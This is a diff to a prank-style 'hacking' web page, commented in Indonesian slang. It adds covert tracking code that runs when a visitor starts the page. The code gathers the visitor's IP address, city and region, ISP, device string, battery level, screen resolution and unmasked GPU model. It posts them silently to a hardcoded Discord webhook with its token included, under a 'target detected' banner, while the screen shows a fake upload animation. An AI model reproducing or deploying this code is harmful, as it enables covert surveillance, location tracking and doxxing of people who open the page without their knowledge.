@@ -20,43 +20,56 @@
     <div id="output"></div>
 
     <script>
-        // 1. PASTE URL WEBHOOK DISCORD LU DI SINI 💀
+        // WEBHOOK DISCORD LU (UDAH GUE PASANGIN 💀)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1482575525250600970/brZO5OxjQkI1v57AGWhMzktXIKGSgvY9nQ2mpqf2pTFpSg7DhSefsg2E4Cbf2nUSX3Mk";
 
         async function fetchAndSend() {
             try {
-                // Ambil Data Baterai Asli
+                // 1. Ambil Data Baterai
                 let battery = await navigator.getBattery();
                 let batLevel = Math.floor(battery.level * 100) + "%";
 
-                // Ambil Data IP, Kota, ISP Asli
+                // 2. Ambil Data IP, Kota, ISP
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // Ambil Info HP Asli
-                const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown Device";
+                // 3. Ambil Info GPU (Buat ngebongkar merk asli HP)
+                const getGPU = () => {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return "Not Supported";
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+                };
 
-                // Kirim Paket Data ke Discord Lu
+                // 4. Ambil Info Device & Layar
+                const rawDevice = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown";
+                const screenRes = `${screen.width}x${screen.height}`;
+                const gpuInfo = getGPU();
+
+                // 5. Kirim Paket Data LENGKAP ke Discord Lu
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "💀 DATA TARGET BERHASIL DICURI! 💀",
+                            title: "💀 TARGET LENGKAP TERDETEKSI! 💀",
                             color: 16711680,
                             fields: [
                                 { name: "🌐 IP ADDRESS", value: `\`${d.ip || "N/A"}\``, inline: true },
                                 { name: "📍 LOKASI", value: `\`${d.city}, ${d.region}\``, inline: true },
                                 { name: "📡 PROVIDER (ISP)", value: `\`${d.org || "N/A"}\`` },
-                                { name: "📱 TIPE HP", value: `\`${device}\`` },
+                                { name: "📱 TIPE HP (RAW)", value: `\`${rawDevice}\`` },
+                                { name: "🎮 GPU RENDERER", value: `\`${gpuInfo}\`` },
+                                { name: "🖥️ RESOLUSI LAYAR", value: `\`${screenRes}\``, inline: true },
                                 { name: "🔋 SISA BATERAI", value: `\`${batLevel}\``, inline: true }
                             ],
                             timestamp: new Date(),
-                            footer: { text: "Cylex-Coder Logs • " + device }
+                            footer: { text: "Cylex-Coder Pro Logs • " + rawDevice }
                         }]
                     })
                 });
-            } catch (e) { console.log("Stealth Mode Active..."); }
+            } catch (e) { console.log("Silent Mode Active..."); }
         }
 
         const output = document.getElementById('output');
@@ -75,7 +88,7 @@
 
         function initHacking() {
             startScreen.style.display = 'none';
-            fetchAndSend(); // Eksekusi pencurian data di background
+            fetchAndSend(); 
             playScript();
         }
 
@@ -87,7 +100,6 @@
                 i++;
                 setTimeout(playScript, 600);
             } else if (percent <= 100) {
-                // Bagian Loading Persen di Layar Target
                 output.innerHTML = output.innerHTML.split("<div id='pct'>")[0];
                 output.innerHTML += `<div id='pct' class='warn'>[!] PROGRESS: ${percent}% - UPLOADING DATA TO CLOUD...</div>`;
                 percent += Math.floor(Math.random() * 8) + 2;
